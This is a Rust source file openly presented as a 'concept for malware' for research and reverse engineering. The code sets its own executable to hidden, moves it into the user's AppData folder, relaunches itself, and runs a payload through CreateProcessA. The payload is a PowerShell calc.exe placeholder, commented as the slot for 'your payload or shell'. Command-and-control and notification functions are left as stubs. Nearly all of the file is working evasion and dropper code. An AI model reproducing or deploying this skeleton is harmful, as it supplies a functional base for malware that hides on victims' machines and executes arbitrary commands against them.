/**
 * Application:  concept.exe
 *
 * Created by:   VPR
 * Created:      February 10th, 2024
 *
 * Updated by:   VPR
 * Updated:      February 24th, 2024
 *
 * Description: This is a concept for malware written in rust for security
 *              research & reverse engineering purposes.
 *
 *              The executable will move itself into the user's AppData/Roaming
 *              and change it's file attributes to hidden, so if you execute it,
 *              that's where you will end up finding it.
 *
 * Disclaimer:  I won't take any responsibility for any crimes or malicious
 *              activity used with any fragments or sections of this source
 *              code. Don't be an idiot.
**/

/** 
 * Definitions
**/
use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;
use winapi::um::winbase::{
    MOVEFILE_COPY_ALLOWED,
    MOVEFILE_REPLACE_EXISTING
};
use winapi::um::processthreadsapi::{
    STARTUPINFOA,
    PROCESS_INFORMATION
};

/** 
 * Classes
**/
use std::path::PathBuf;
use std::process::{
    Command,
    Stdio
};
use std::ffi::{
    CString,
    NulError
};

/** 
 * Functions
**/
use winapi::um::processthreadsapi::CreateProcessA;
use winapi::um::winbase::MoveFileExA;
use winapi::um::fileapi::{
    GetFileAttributesA,
    SetFileAttributesA,
};

/** 
 * Extensions
**/
use std::os::windows::ffi::OsStrExt;



fn pathbuf_to_const_i8_pointer(path_buf: &PathBuf) -> Result<*const i8, NulError> {
    let os_str = path_buf.as_os_str();
    let wide_chars: Vec<u16> = os_str.encode_wide().collect();
    let string_utf8 = String::from_utf16(&wide_chars).expect("Invalid UTF-16");
    let c_str = CString::new(string_utf8)?;

    Ok(c_str.into_raw() as *const i8) // into_raw to avoid dealloc; remember to convert back to CString and drop it to avoid memory leak
}

fn is_in_target_path() -> bool {
    true
}

fn is_connected_to_server() -> bool {
    // This would be where you check your connection
    // to yourself
    true
}

fn rerun_self(new_path: &String) {
    Command::new(new_path)
        .args(["arbitrary string"])
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .output()
        .expect("failed to execute command.");

    std::process::exit(0)
}

fn send_notification() {
    // This would be where you notify yourself
}

fn execute() {
    unsafe {
        let mut si: STARTUPINFOA = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        CreateProcessA(
            std::ptr::null_mut(),
            "powershell.exe -nop -c calc.exe\0".as_ptr() as *mut i8, // This would be your payload or shell
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut si,
            &mut pi
        );
    }
}

fn hide_file(path: &PathBuf) -> Result<String, ()> {
    let path_str = pathbuf_to_const_i8_pointer(path).unwrap();
    let new_path = std::env::var("APPDATA").unwrap() + "\\concept.exe";
    let c_new_path = CString::new(new_path)
        .expect("failed to allocate CString.");

    unsafe {
        // Set Attributes to Hidden
        let attributes = GetFileAttributesA(path_str);
        let set_result = SetFileAttributesA(
            path_str,
            attributes | FILE_ATTRIBUTE_HIDDEN
        );

        if set_result == 0 {
            return Err(())
        }


        // Move to %AppData%
        let move_result = MoveFileExA(
            path_str,
            c_new_path.as_ptr() as *const i8,
            MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING
        );

        if move_result == 0 {
            return Err(())
        }
    }

    // let dealloc = CString::new(path_str).expect("Failed to alloc CString.");
    Ok(c_new_path.into_string().unwrap())
}

fn main() {
    let current_exe_path: PathBuf = std::env::current_exe().unwrap();
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 2 {
        match hide_file(&current_exe_path) {
            Ok(hidden_file) => rerun_self(&hidden_file),
            Err(_) => ()
        }
    }

    if is_in_target_path() {
        send_notification();
    }

    let mut connected: bool = false;
    for _ in 0..5 {
        if !connected && is_connected_to_server() {
            connected = true;
            execute();
        }

        let minute_ms = std::time::Duration::from_millis(60_000);
        std::thread::sleep(minute_ms);
    }
}
